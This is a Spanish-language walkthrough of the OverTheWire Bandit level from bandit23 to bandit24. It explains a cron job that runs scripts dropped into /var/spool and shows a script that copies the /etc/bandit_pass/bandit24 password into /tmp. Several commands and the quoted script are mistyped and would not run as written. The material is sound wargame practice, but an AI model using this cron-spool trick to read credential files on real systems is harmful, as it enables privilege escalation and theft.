Volvemos o seguimos con Cron "/etc/cron.d" siguiendo esta ruta, nos encontramos otro programa.

```
cd /var/spoo/$myname
```
Si hacemos un "-ls -la" nos encontramos que tenemos permisos de ejecución y escritura.

```
for i in *.*;
```
Nos referimos a todos los elementos del directorio
```
if ["$i"] = "!" -a "$i" != ".."];
then
echo "Hadling $i"
if [$owner = "bandit23"]; then
    timeout -s 9 60 ./$i
  fi
  rm -f ./$i
done
```
Si la variable i no vale el directorio actual retrocede, entonces coge la variable y ejecuta el archivo que haya dentro y posteriomente lo borra. de 9 a 60 s

Después de entender esto sabemos que debemos hacer, un archivo que lea la pass de bandit24

Cremoa en temp
```
mktemo -d
```
Le daremos permisos de ejecución y escritura
```
chmod o+rxw
touch script.sh
chmod +x script.sh
```
Sabemos que es en "/var/spool"

```
#!/bin/Bash
cat /etc/bandit_pass/bandit24 > /tmp/ruta.txt
```
Hacemos que coja la pass y nos la devuelva en un archio txt

Postreiormente copiamos el archivo a una direccion donde se pueda ejecutar

```
cp script.sh /var/spool/bandit24/script.sh
```
